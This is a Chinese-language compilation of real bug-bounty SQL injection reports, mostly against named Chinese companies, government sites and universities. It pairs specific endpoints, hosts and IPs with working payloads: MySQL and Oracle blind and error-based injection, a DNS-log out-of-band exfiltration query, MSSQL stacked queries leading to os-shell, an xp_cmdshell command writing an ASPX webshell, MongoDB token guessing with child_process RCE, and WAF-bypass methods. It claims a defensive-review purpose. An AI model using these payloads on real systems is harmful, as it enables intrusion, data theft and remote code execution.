# SQL 注入实战案例（ima 案例库深挖）

> **回查原文** → `ima-retrieval-index.md` §三（ima `src报告/SQL注入/` folder_id + 关键词 + 报告名直搜）。

> 来源：ima 知识库 `src` → `src报告/SQL注入/`（97 条 → 去重后 72 份唯一，实读 18 份，读取失败/乱码 3 份）
> 定位：**打法与真实 payload 的实战补充**；系统方法论见 `sqli-advanced-test.md`，本文件只收"真实绕过、真实 payload、真实判定与定级"。
> 生成日期：2026-09-14
> ⚠️ 仅作威胁认知与防守复盘，SRC 一律不做社工/钓鱼/免杀/拿 shell 之外的越界动作。

## 一、打法分类（按注入点/数据库类型重组，不按报告罗列）

### A. MySQL 相关
- **Spring Cloud 控制台注入（京东）**：注入点 `GET /mymenus?eurekaName=`。判定 `eurekaName=1' and 1=if(1=1 AND 6871=6871,1,exp(720)) and'1='1`，触发 `exp(720)` 溢出报错即可确认 MySQL；sqlmap 跑出库名 `db_console`。
- **排序参数报错注入（河南省博士后）**：`POST /erupt-api/data/table/Notice`，JSON 体 `{"sort":"sort"}`。用 `sort/exp(824-ascii(SUBSTRING(user(),1,1)))` 触发 `exp(710)` 溢出报错，逐位爆破 `user()`（第1位 824-710=114='l'）。需登录态 token。
- **POST 参数布尔盲注（贵州省）**：`POST /gz_society/society/production/list`，参数 `queryName`。`queryName='or if(ORD(MID(@@hostname,1,1))=109,exp(1),exp(1111)) or'` 布尔盲注爆主机名 `mysql-matser1`。
- **JSON/Referer 盲注（众测、某 CMS）**：众测 app 末位 `visitor_static_id` 单引号报错，sqlmap 出 MySQL RLIKE/时间盲注；某 skymvc CMS 前台 `Referer` 头直接拼入 `selectRow`，`Referer: ...' RLIKE (SELECT(CASE WHEN(8524=8524)THEN 0x637363 ELSE 0x28 END))--` 布尔盲注。

### B. Oracle 相关
- **登录框/接口布尔+时间盲注（贝壳找房、某系统、edu 小程序）**：jsp+Oracle 特征为单引号报错、双引号正常。`userid=888' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10)) and '1='1` 时间盲注；edu 案例中小程序 `order_flow_status`、身份证字段在 WAF 下用 `exp(0)=1` 布尔、`ord()+right()` 爆版本/库名。
- **Oracle 延时/DNSlog（edu 小程序·就诊挂号）**：`userID=27551 or 1=1` 恒真泄露全表（身份证/电话/住址）；因缺 `from` 判定为 Oracle；`and DBMS_PIPE.RECEIVE_MESSAGE('ICQ',5)=1` 延时；`and (select utl_inaddr.get_host_address((select user from dual)||'.dnslog') from dual) is not null --` 数据带外。

### C. SQL Server (MSSQL) 相关
- **登录框堆叠→os-shell（宏业供应链）**：`POST /login.do` 参数 `usercode`，`usercode=1';WAITFOR DELAY '0:0:5'--` 堆叠确认，sqlmap `--os-shell` 拿 `nt authority\system`。
- **JSON 接口报错（用友 U8 Cloud）**：`POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery`，`{"reportType":"1' and 1=user--+",...}` 返回"nvarchar 转 int 失败"确认 MSSQL。
- **ashx UNION（智邦国际）**：`/SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12+UNION+ALL+SELECT+NULL,NULL,char(115)+...+char(99),NULL--` 回显 `scamagic`。
- **堆叠写 shell（汕头技师、烟台大学）**：.NET `order by ZYOrder,zymc` 报错暴露注入点，`txtName=1';select 1/db_name()--`；烟台大学教工报销 `where` 参数 union（9列）+堆叠 `;exec master..xp_cmdshell 'echo <%@ Page ... eval(Request.Item["ytu"])%> >> e:/.../2.aspx'` 写马。
- **权限/xp_cmdshell 判定（某大学）**：`and exists(select count(*) from sysobjects)` 判 MSSQL；`substring((select @@version),22,4)='2005'` 判版本；`IS_MEMBER('db_owner')` 判权限；`count(*) FROM master..sysobjects WHERE xtype='X' AND name='xp_cmdshell'` 判命令执行可达。

### D. MongoDB 注入（YApi）⚠️红队/防守复盘范畴
- `POST /api/interface/up` 中 `token` 字段接受对象：`{"id":-1,"token":{"$regex":"^1cae...","$nin":[]}}`，借报错回显逐字符猜解其他用户 token；已知 `defaultSalt='abcde'`（aes192）可伪造加密 token；`/api/open/run_auto_test` 的 `after_script` 经 `process.mainModule.require("child_process").execSync(...)` 造成 VM 逃逸 RCE。**SRC 侧仅取其"接口未校验 token 类型即越权"一点。**

### E. WAF 绕过
- **协议未覆盖绕过（某系统 Oracle）**：目标有深信服 WAF，改用 `multipart/form-data` 把 payload 放进 `loginId` 字段绕过。
- **真实 IP / 漏防接口绕过（方法论）**：上 WAF 时找真实 IP 直连、或爬全站接口找开发漏加 WAF 的口子。
- **预编译盲区**：`order by / sort / desc / limit / 表名列名` 等可控但非"用户输入"处仍可注入。

## 二、WAF 绕过与 payload 实战表

| 场景/指纹 | 绕过手法 | 可用 payload / 命令 | 来源案例 |
|---|---|---|---|
| 深信服 WAF + jsp/Oracle | multipart 协议未覆盖 | `loginId=admin' and 'T'='1`（放 multipart 字段） | 某系统Oracle+盲注bypass |
| 站点上云 WAF | 找真实 IP 直连 / 爬漏防接口 | 同上两类思路 | 众测下的SQL注入挖掘 |
| 预编译防护 | 打 order by/sort/limit 等盲区 | `sort/exp(824-ascii(SUBSTRING(user(),1,1)))` | 河南省博士后 |
| WAF 禁 select/ascii/sleep | 改用 exp(0)/ord()/right() | `exp(0)=1` 布尔；`ord(right(version,1))=53` | edu-SQL案例分享 |
| 教育站 WAF bypass | cookie FK_Dept 处注入（奥普基AI 工作流） | 见吉林工业（内容 OCR 乱码，仅标题可判） | 吉林工业职业技术大学 |

## 三、按功能点的排查 Checklist（优先打哪些接口/参数）

1. **登录/注册框**：`usercode/userid/loginId/account/password`，尤其 `usercode` 常可堆叠（MSSQL）。
2. **排序/分页参数**：`sort/order by/desc/limit/pageSize/queryName`，预编译常漏防（河南、贵州）。
3. **日志/查询功能点**："日志查询""办理""统计"的查询参数（edu 九连杀 AUD_RESOURCE/ZHCZLXID/SQMC）。
4. **JSON 接口末位 id**：app/小程序每个 `xxx_id`，尤以后缀 id 最易漏（众测客服点）。
5. **Referer / 头字段**：CMS 把 `HTTP_REFERER` 直接进 SQL（skymvc）。
6. **后台/供应商系统**：用友 U8、智邦国际、宏业供应链、蓝凌、YApi 等默认接口。
7. **文件上传/头像/选择单位** 等伴随注入（见各"文件上传+sql注入"合集）。
8. **越权伴随**：注入常与越权同点出现（贝壳、成都师范、苏州大学）。

## 四、案例索引

| # | 报告名 | 平台 | 目标/系统 | 注入点 | 核心手法 | 结果/定级 |
|---|---|---|---|---|---|---|
|1|京东一处SQL注入|Web|Spring Cloud 控制台|`/mymenus?eurekaName=`|if()+exp(720) 溢出判定 MySQL|高危/赏金|
|2|某系统Oracle+盲注bypass|Web|wx.gd21ec.com 登录|loginId|multipart 绕过 WAF + Oracle 盲注|高危|
|3|用有u8注入|Web|用友-U8-Cloud|KeyWordReportQuery JSON|JSON 报错确认 MSSQL|高危|
|4|智邦国际-GetAllPrintTemplate|Web|智邦国际 ERP|ashx?sort=|UNION ALL SELECT 回显|高危|
|5|贝壳找房越权+Oracle盲注|Web|ekp 系统|appCanSign.userid|DBMS_PIPE 时间盲注+越权|高危|
|6|河南省人民政府博士后|Web|hnpostdoctor.hrss.henan.gov.cn|/erupt-api Notice.sort|exp() 排序报错注入|高危|
|7|贵州省人民政府|Web|spzs.amr.guizhou.gov.cn|production/list.queryName|if(ORD(MID(@@hostname))) 盲注|高危|
|8|YApi 接口管理平台|Web|YApi|/api/interface/up token|MongoDB $regex + VM 逃逸|⚠️RCE链/复盘|
|9|宏业科技供应链|Web|宏业-SCM|/login.do usercode|MSSQL 堆叠→os-shell|严重/RCE|
|10|众测下的SQL注入挖掘|Web|某 App 客服|visitor_static_id|末位 id 盲注，4k 赏金|高危/赏金|
|11|[代码审计]某cms Referer注入|Web|skymvc CMS|HTTP Referer|Referer 拼入 selectRow|中危/代码审计|
|12|吉林工业职业技术大学 WAF bypass|EduSRC|奥普基AI 工作流|cookie FK_Dept|WAF bypass（内容乱码）|高危|
|13|edu实战SQL注入九连杀|EduSRC|同系统多参数|AUD_RESOURCE/ZHCZLXID/SQMC|时间盲注（space2comment）|中危×多(1~4分)|
|14|edu-SQL注入案例分享|EduSRC|多校小程序|json 字段/身份证|小程序盲注+Oracle DNSlog|中危|
|15|中国农业大学SQL注入_远程命令执行|EduSRC|123.57.61.125:8080|/system/role/list dataScope|extractvalue 报错+弱口令+Shiro|高危|
|16|随机遇到的某大学 sqlserver|EduSRC|随机 edu 站|id|sysobjects/xp_cmdshell 判定|高危|
|17|汕头技师学院堆叠注入|EduSRC|157.122.128.231:8005|StudentRegView.txtName|堆叠 `select 1/db_name()`|高危|
|18|烟台大学 get shell|EduSRC|教工报销系统|where 参数|union+堆叠写 aspx shell|高危(6)|
|19|上海交大 sql注入|EduSRC|yjs.naoce.sjtu.edu.cn|注册资料包|If(left(database(),1)) 布尔盲注|高危|
|20|成都师范学院信息门户|EduSRC|cdnu.edu.cn|用户管理 c0-param1|sql注入+越权打包|严重(10)|
|21|苏州大学南京南软|EduSRC|yjsgl.suda.edu.cn|通知公告|报错注入+越权+上传 getshell|高危(8)|
|22|上海交大南京先极毕设|EduSRC|bysj.jwc.sjtu.edu.cn|教师工号查询|堆叠注入+getshell|高危(10)|
|23|天津财经大学南京先极|EduSRC|172.26.1.42|selsec.aspx|越权+SQL注入|中危(4)|
|24|北京大学 sql注入|EduSRC|EMBA 登录|/emba/account/login|登录处注入|中危（读取失败220030）|
|25|浙江大学 sql注入|EduSRC|cwcx.zju.edu.cn|/WFManager/login.jsp|登录注入|中危(2)|
|26|中南财经政法大学|EduSRC|—|—|sql注入|中危(0)|
|27|广东工业大学|EduSRC|微信小程序·管理学院|小程序接口|sql注入|中危|
|28|常熟理工小程序|小程序|理工微门户|身份绑定接口|sql注入|中危|

## 五、未精读清单（标题级归类）

- **科普/方法论（Web，未逐字读，内容偏通识）**：`05-浅谈企业SQL注入危害与防御`、`42-详解XPath注入`、`56-二次注入漏洞解析`、`86-web漏洞挖掘之SQL注入`、`php代码审计之sql注入`、`python调用sqlmapapi批量扫描`、`sql注入通杀（已看）`、`教育部sql`、`从注入峰回路转到内网漫游`、`记一次攻防从SQL注入到拿下域控`、`蓝凌sql注入`(8.6MB 超大，仅框架：OA 注入)、`兰州getshell.png`、`新疆交通2.png`、`xxxx公司存在SQL注入`、`UsualToolCMS a_templetex.php`、`Subrion CMS database.php`、`前台sql`(华测监测预警)、`湖南弘林/河南省/贵州省`(政府站，已读代表)、`YApi`(已读)。
- **教育侧合集（未逐字读，intro 可判）**：`某附中+北大+北师大`(万能密码 `'or 1=1--`)、`某徽工业大学+某能源学院+xx师范`(文件上传+注入)、`xx学院+教育局+某考试院`(未授权+注入)、`xx中学+xx实验中学+xx民族大学`、`无锡商业职业技术学院`、`毫州学院注入`(高危5)、`雷式高中`、`浙江大学-存在sql注入-2`(cp_id 接口)、`上海交大-存在sql`/`上交sql`/`上交大.png`(SJTU 系列)、`上海交大——逻辑+延时SQL注入（不打码）`(Web侧图)。
- **超大 HTML getshell 链（>5MB，仅框架）**：`成都师范学院`(sql+越权严重10)、`苏州大学`(报错+越权+上传 getshell 高危8)、`上海交大南京先极`(堆叠+getshell 高危10)、`天津财经大学`(越权+注入 中危4)——细节未穷尽，按 intro 列入索引。

## 六、厂商定级尺度观察（哪些被判高危/中危/忽略，理由）

- **给高危/严重**：能 getshell、堆叠写文件、大量信息泄露、或 WAF bypass 成功。例：宏业供应链 RCE=严重；成都师范 sql+越权打包=严重10；上海交大南京先极堆叠+getshell=高危10；苏州大学报错+getshell=高危8；烟台大学写 shell=高危6；吉林工业 WAF bypass=高危。
- **给中危**：单纯时间/布尔盲注且无进一步利用，或同类重复。edu 九连杀多处中危、同类重复仅 1~4 分；浙江大学中危2；天津财经中危4。
- **给低/0（忽略倾向）**：中南财经政法中危0（疑似重复或危害低）；纯科普/已看类不计入定级。
- **Web/SRC 赏金侧**：能 RCE 或盲注拖数据通常高危，众测"客服点盲注"即拿 4k。
- **规律**：教育侧对"可进一步 getshell/越权"加成极大；对"盲注但无利用链"压到低分；WAF bypass 单独受重视。

## 七、素材缺口

1. **缺 PostgreSQL / SQLite 实战**：案例几乎全是 MySQL/MSSQL/Oracle，仅 YApi 为 MongoDB，缺 PG/SQLite 真实 payload。
2. **缺二次注入、XPath 注入实操**：仅有科普 PDF，未沉淀可复用 payload。
3. **缺预编译绕过深挖**：MyBatis `${}`、ORDER BY 拼接等仅有方法论，缺真实站案例。
4. **缺联合注入直接回显脱库范例**：教育侧多为盲注，少高 Rank 脱库演示。
5. **缺 Redis/CouchDB 等 NoSQL**：仅 MongoDB 一例。
6. **读取失败/乱码**：北京大学 sql 注入（code 220030 读取失败）、吉林工业 WAF bypass ×2（OCR 乱码仅标题可判），需回 ima 补读。

## 红线标注
- `邮箱html注入.docx`：内容为邮件 HTML 注入/钓鱼（"西瓜来钓鱼啦"、支付宝收款方式、html 编码），属 ⚠️红线 **社工/钓鱼**，已标注，不推荐任何手法，仅作威胁认知。
- `YApi` 的 VM 逃逸 RCE、宏业/烟台的 os-shell/写马 属 **红队利用链**，SRC 侧只取其"越权/注入点"作为防守要点，不提倡在 SRC 中复现拿 shell。
